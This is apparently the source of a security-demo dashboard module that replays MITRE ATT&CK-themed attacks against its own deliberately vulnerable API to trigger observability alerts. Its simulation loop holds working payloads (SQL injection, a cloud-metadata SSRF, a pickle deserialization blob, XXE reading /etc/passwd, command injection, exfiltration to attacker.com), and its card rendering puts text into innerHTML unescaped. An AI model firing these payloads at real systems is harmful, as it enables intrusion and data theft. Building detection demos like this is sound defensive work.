/**
 * Seven Kingdoms App - Security Demo Module
 * Integrated with OCI Observability Platform
 */

const SevenKingdoms = (function() {
    'use strict';

    // State
    const state = {
        software: [],
        activeSimulations: [],
        logs: [],
        config: {
            apmEnabled: false,
            rumEnabled: false,
            loggingEnabled: false,
            batchSize: 10
        },
        simulationInterval: null
    };

    // DOM Elements
    let container = null;
    let consoleEl = null;

    // Initialization
    function init() {
        // Create module container if it doesn't exist
        if (!document.getElementById('module-sevenkingdoms')) {
            createModuleStructure();
        }
        
        container = document.getElementById('module-sevenkingdoms');
        render();
        fetchSoftwareData();
        
        // Check for .env.local simulation
        checkEnvConfig();

        console.log('Seven Kingdoms Security App Initialized');
    }

    function createModuleStructure() {
        const main = document.querySelector('main.main-content');
        if (!main) return;

        const section = document.createElement('section');
        section.id = 'module-sevenkingdoms';
        section.className = 'module';
        main.appendChild(section);
    }

    function checkEnvConfig() {
        // Simulating reading from .env.local
        // In a real app, this would be injected by the build process or fetched from an API
        const savedConfig = localStorage.getItem('sk-config');
        if (savedConfig) {
            state.config = JSON.parse(savedConfig);
        } else {
            // Default "env" values
            state.config.apmEnabled = true;
            state.config.rumEnabled = true;
            state.config.loggingEnabled = true;
        }
    }

    // Data Fetching
    async function fetchSoftwareData() {
        try {
            log('INFO', 'Fetching MITRE ATT&CK Software data...');
            // Using the raw GitHub content for the STIX JSON
            const response = await fetch('https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json');
            
            if (!response.ok) throw new Error('Network response was not ok');
            
            const data = await response.json();
            
            // Filter for software (malware and tools)
            state.software = data.objects.filter(obj => 
                obj.type === 'malware' || obj.type === 'tool'
            ).map(obj => ({
                id: obj.external_references?.[0]?.external_id || obj.id,
                name: obj.name,
                description: obj.description || 'No description available.',
                type: obj.type,
                platforms: obj.x_mitre_platforms || [],
                status: 'idle'
            }));

            log('INFO', `Successfully loaded ${state.software.length} software definitions`);
            updateStats();
            renderBatchList();

        } catch (error) {
            log('ERROR', `Failed to load MITRE data: ${error.message}`);
            // Fallback data if fetch fails
            state.software = [
                { id: 'S0002', name: 'Mimikatz', description: 'Credential dumper capable of obtaining plaintext Windows passwords.', type: 'tool', status: 'idle' },
                { id: 'S0003', name: 'Cobalt Strike', description: 'Commercial adversary simulation software.', type: 'tool', status: 'idle' },
                { id: 'S0012', name: 'PoisonIvy', description: 'A popular remote access tool (RAT).', type: 'malware', status: 'idle' },
                { id: 'S0013', name: 'PlugX', description: 'Remote access tool (RAT) with modular plugins.', type: 'malware', status: 'idle' }
            ];
            renderBatchList();
        }
    }

    // Simulation Logic
    async function startSimulation() {
        if (state.simulationInterval) return;
        
        const batch = state.software.slice(0, state.config.batchSize);
        state.activeSimulations = batch;
        
        log('ALERT', `Starting live attack simulation: ${batch.length} threats`);
        
        renderBatchList();
        
        state.simulationInterval = setInterval(async () => {
            // Pick a random software from batch
            const index = Math.floor(Math.random() * state.activeSimulations.length);
            const sw = state.activeSimulations[index];
            
            // Phase 3 & 4 Background Traffic (Bot behavior generating OCI Log Correlation & DB APM)
            setTimeout(() => {
                const gotBotTraffic = [
                    () => fetch(`/api/v1/got/wildlings?name=Tormund%27%20UNION%20SELECT%20flag%20FROM%20secrets--`),
                    () => fetch(`/api/v1/got/dragons?url=http://169.254.169.254/opc/v2/instance/`),
                    () => fetch('/api/v1/ctf/import_profile?payload=gASVNwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBdlY2hvIEZMQUdfSU5KRUNURUQgIC90bXAvcS50eHRIhZRSlC4=', { method: 'POST' }),
                    () => fetch('/api/v1/ctf/xml_upload', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/xml' },
                        body: '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'
                    })
                ];
                const randomGotBot = gotBotTraffic[Math.floor(Math.random() * gotBotTraffic.length)];
                randomGotBot().catch((e) => console.log("Simulated GoT request failed", e));
            }, 1200);
            
            if (sw.status === 'detected' || sw.status === 'blocked') return;

            if (sw.status === 'idle') {
                sw.status = 'running';
                log('WARN', `Execution started: ${sw.name} (${sw.id})`);
                
                // Caldera-Enhanced API Selection Logic
                try {
                    let res, data;
                    const swName = sw.name.toLowerCase();

                    // 1. Exfiltration Simulation (T1041, T1048)
                    if (swName.includes('exfil') || swName.includes('ftp') || swName.includes('rsync')) {
                        log('INFO', `[API] Triggering Exfiltration: /api/v1/exfiltration/upload`);
                        res = await fetch('/api/v1/exfiltration/upload?target_url=http://attacker.com/sink', { method: 'POST' });
                        data = await res.json();
                        sw.status = 'detected';
                        log('ALERT', `[OCI] Data exfiltration attempt detected by log analysis!`);
                    }
                    // 2. Lateral Movement & SSRF (T1021, T1046)
                    else if (swName.includes('scan') || swName.includes('bloodhound') || swName.includes('responder')) {
                        const target = `http://10.0.2.${Math.floor(Math.random() * 254)}:22`;
                        log('INFO', `[API] Triggering Lateral Movement Probe: /api/v1/network/proxy?url=${target}`);
                        res = await fetch(`/api/v1/network/proxy?url=${encodeURIComponent(target)}`);
                        data = await res.json();
                        if (data.status === 'connected') {
                            sw.status = 'detected';
                            log('ALERT', `[OCI] Internal network probe (SSRF) detected!`);
                        }
                    }
                    // 3. Credential Access (T1552)
                    else if (swName.includes('mimi') || swName.includes('key') || swName.includes('auth')) {
                        log('INFO', `[API] Triggering Credential Leak: /api/v1/auth/config`);
                        res = await fetch('/api/v1/auth/config');
                        data = await res.json();
                        sw.status = 'detected';
                        log('ALERT', `[OCI] Unsecured credential exposure detected!`);
                    }
                    // 4. Legacy SQLi (T1190)
                    else if (sw.type === 'tool') {
                        const query = `${sw.name}' OR '1'='1`;
                        log('INFO', `[API] Triggering SQLi test: /api/v1/users/search?q=${query}`);
                        res = await fetch(`/api/v1/users/search?q=${encodeURIComponent(query)}`);
                        data = await res.json();
                        if (data.exploited) {
                            sw.status = 'detected';
                            log('ALERT', `[OCI] SQL Injection confirmed by backend!`);
                        }
                    } 
                    // 5. Legacy RCE (T1059)
                    else {
                        const cmd = `whoami; # ${sw.name}`;
                        log('INFO', `[API] Triggering RCE test: /api/v1/system/diagnostics?cmd=${cmd}`);
                        res = await fetch(`/api/v1/system/diagnostics?cmd=${encodeURIComponent(cmd)}`);
                        data = await res.json();
                        if (data.output && data.output.includes('WARNING')) {
                            sw.status = 'blocked';
                            log('ALERT', `[WAF] Suspicious command blocked!`);
                        }
                    }
                } catch (e) {
                    log('ERROR', `API Connection failed: ${e.message}`);
                }
            }
            
            renderBatchList();
            updateStats();
            
            // Check if all done
            if (state.activeSimulations.every(s => s.status === 'detected' || s.status === 'blocked')) {
                stopSimulation();
                log('INFO', 'Live simulation batch completed');
            }
        }, 1500);
    }

    function stopSimulation() {
        if (state.simulationInterval) {
            clearInterval(state.simulationInterval);
            state.simulationInterval = null;
        }
    }

    // Rendering
    function render() {
        container.innerHTML = `
            <div class="sk-header">
                <h2 class="sk-title">Vulnerable App</h2>
                <div class="sk-subtitle">Security Demo & Attack Simulation Dashboard</div>
            </div>

            <div class="sk-grid">
                <!-- Sidebar Config -->
                <aside class="sk-sidebar">
                    <div class="sk-section-title">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="18" height="18">
                            <path d="M12 2a2 2 0 0 1 2 2c0 .74-.4 1.39-1 1.73V7h1a7 7 0 0 1 7 7h1a1 1 0 0 1 1 1v3a1 1 0 0 1-1 1h-1v1a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-1H2a1 1 0 0 1-1-1v-3a1 1 0 0 1 1-1h1a7 7 0 0 1 7-7h1V5.73c-.6-.34-1-.99-1-1.73a2 2 0 0 1 2-2z"/>
                        </svg>
                        Configuration (.env.local)
                    </div>
                    
                    <div class="sk-config-item">
                        <label class="sk-label">APM Collection</label>
                        <select id="config-apm" class="sk-input">
                            <option value="true" ${state.config.apmEnabled ? 'selected' : ''}>Enabled</option>
                            <option value="false" ${!state.config.apmEnabled ? 'selected' : ''}>Disabled</option>
                        </select>
                    </div>

                    <div class="sk-config-item">
                        <label class="sk-label">RUM Collection</label>
                        <select id="config-rum" class="sk-input">
                            <option value="true" ${state.config.rumEnabled ? 'selected' : ''}>Enabled</option>
                            <option value="false" ${!state.config.rumEnabled ? 'selected' : ''}>Disabled</option>
                        </select>
                    </div>

                    <div class="sk-config-item">
                        <label class="sk-label">OCI Logging</label>
                        <select id="config-logging" class="sk-input">
                            <option value="true" ${state.config.loggingEnabled ? 'selected' : ''}>Enabled</option>
                            <option value="false" ${!state.config.loggingEnabled ? 'selected' : ''}>Disabled</option>
                        </select>
                    </div>

                    <div class="sk-config-item">
                        <label class="sk-label">Batch Size</label>
                        <input type="number" id="config-batch" class="sk-input" value="${state.config.batchSize}" min="1" max="50">
                    </div>

                    <button id="btn-publish" class="sk-btn sk-btn-secondary" style="margin-top: 24px;">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16">
                            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
                            <polyline points="7 10 12 15 17 10"/>
                            <line x1="12" y1="15" x2="12" y2="3"/>
                        </svg>
                        Publish App
                    </button>
                </aside>

                <!-- Main Dashboard -->
                <div class="sk-dashboard">
                    <!-- Stats Row -->
                    <div class="sk-stats-row">
                        <div class="sk-stat-card">
                            <span class="sk-stat-value" id="stat-total">0</span>
                            <span class="sk-stat-label">Total Definitions</span>
                        </div>
                        <div class="sk-stat-card">
                            <span class="sk-stat-value" id="stat-active" style="color: #F59E0B;">0</span>
                            <span class="sk-stat-label">Active Sims</span>
                        </div>
                        <div class="sk-stat-card">
                            <span class="sk-stat-value" id="stat-detected" style="color: #EF4444;">0</span>
                            <span class="sk-stat-label">Detected</span>
                        </div>
                        <div class="sk-stat-card">
                            <span class="sk-stat-value" id="stat-blocked" style="color: #10B981;">0</span>
                            <span class="sk-stat-label">Blocked</span>
                        </div>
                    </div>

                    <!-- Simulation Area -->
                    <div class="sk-simulation-area">
                        <div class="sk-toolbar">
                            <h3 style="margin: 0; font-size: 1rem;">Attack Simulations</h3>
                            <button id="btn-start-sim" class="sk-btn sk-btn-primary" style="width: auto; padding: 8px 24px;">
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16">
                                    <polygon points="5 3 19 12 5 21 5 3"/>
                                </svg>
                                Start Batch
                            </button>
                        </div>
                        <div id="sk-batch-list" class="sk-batch-list">
                            <!-- Cards go here -->
                            <div style="grid-column: 1/-1; text-align: center; color: var(--text-muted); padding: 40px;">
                                Ready to start simulation.
                            </div>
                        </div>
                    </div>

                    <!-- Console -->
                    <div class="sk-console" id="sk-console">
                        <div class="log-entry">
                            <span class="log-time">[SYSTEM]</span>
                            <span class="log-msg">Console initialized. Waiting for events...</span>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Publish Modal -->
            <div class="sk-modal" id="publish-modal">
                <div class="sk-modal-content">
                    <h3 style="margin-top: 0;">Publish Vulnerable App</h3>
                    <p>The application is ready to be deployed as a standalone service.</p>
                    <div style="background: var(--surface-2); padding: 16px; border-radius: 8px; text-align: left; margin: 16px 0; font-family: monospace; font-size: 0.85rem;">
                        <div style="color: #10B981;">✓ Configuration validated</div>
                        <div style="color: #10B981;">✓ Data sources connected</div>
                        <div style="color: #10B981;">✓ Detection rules compiled</div>
                    </div>
                    <p style="font-size: 0.9rem; color: var(--text-muted);">
                        Deployment package created in <code>./dist/seven_kingdoms/</code>
                    </p>
                    <button class="sk-btn sk-btn-primary" onclick="document.getElementById('publish-modal').classList.remove('active')">
                        Close
                    </button>
                </div>
            </div>
        `;

        // Bind Events
        document.getElementById('btn-start-sim').addEventListener('click', startSimulation);
        document.getElementById('btn-publish').addEventListener('click', () => {
            document.getElementById('publish-modal').classList.add('active');
        });

        // Config listeners
        ['config-apm', 'config-rum', 'config-logging', 'config-batch'].forEach(id => {
            document.getElementById(id).addEventListener('change', (e) => {
                const key = id.replace('config-', '');
                if (key === 'batch') {
                    state.config.batchSize = parseInt(e.target.value);
                } else {
                    state.config[key + 'Enabled'] = e.target.value === 'true';
                }
                localStorage.setItem('sk-config', JSON.stringify(state.config));
                log('INFO', `Configuration updated: ${key} = ${e.target.value}`);
            });
        });

        consoleEl = document.getElementById('sk-console');
    }

    function renderBatchList() {
        const list = document.getElementById('sk-batch-list');
        if (!list) return;

        if (state.activeSimulations.length === 0 && state.software.length > 0) {
            // Show first 10 preview
             list.innerHTML = state.software.slice(0, 4).map(renderCard).join('') + 
             `<div style="grid-column: 1/-1; text-align: center; color: var(--text-muted); padding: 20px;">
                + ${state.software.length - 4} more definitions loaded. Click 'Start Batch' to simulate.
              </div>`;
             return;
        }

        list.innerHTML = state.activeSimulations.map(renderCard).join('');
    }

    function renderCard(item) {
        let statusClass = '';
        let statusText = 'Idle';
        
        if (item.status === 'running') { statusClass = 'running'; statusText = 'Executing...'; }
        else if (item.status === 'detected') { statusClass = 'detected'; statusText = 'Detected'; }
        else if (item.status === 'blocked') { statusClass = 'blocked'; statusText = 'Blocked'; }

        return `
            <div class="sk-attack-card">
                <div class="sk-attack-header">
                    <span class="sk-attack-name">${item.name}</span>
                    <span class="sk-attack-id">${item.id}</span>
                </div>
                <div class="sk-attack-desc" title="${item.description}">${item.description}</div>
                <div class="sk-attack-status">
                    <span class="status-dot ${statusClass}"></span>
                    <span>${statusText}</span>
                </div>
            </div>
        `;
    }

    function updateStats() {
        document.getElementById('stat-total').textContent = state.software.length;
        document.getElementById('stat-active').textContent = state.activeSimulations.filter(s => s.status === 'running').length;
        document.getElementById('stat-detected').textContent = state.activeSimulations.filter(s => s.status === 'detected').length;
        document.getElementById('stat-blocked').textContent = state.activeSimulations.filter(s => s.status === 'blocked').length;
    }

    function log(type, message) {
        if (!consoleEl) return;
        
        const entry = document.createElement('div');
        entry.className = 'log-entry';
        
        const time = new Date().toLocaleTimeString();
        entry.innerHTML = `
            <span class="log-time">[${time}]</span>
            <span class="log-type ${type}">${type}</span>
            <span class="log-msg">${message}</span>
        `;
        
        consoleEl.appendChild(entry);
        consoleEl.scrollTop = consoleEl.scrollHeight;
    }

    // Public API
    return {
        init: init
    };

})();

// Auto-init when loaded if the module section exists, 
// otherwise wait for call
document.addEventListener('DOMContentLoaded', () => {
    // We don't auto-init because we want to wait for the main app to possibly create the section
    // But we can check if we should expose it globally
    window.SevenKingdoms = SevenKingdoms;
});
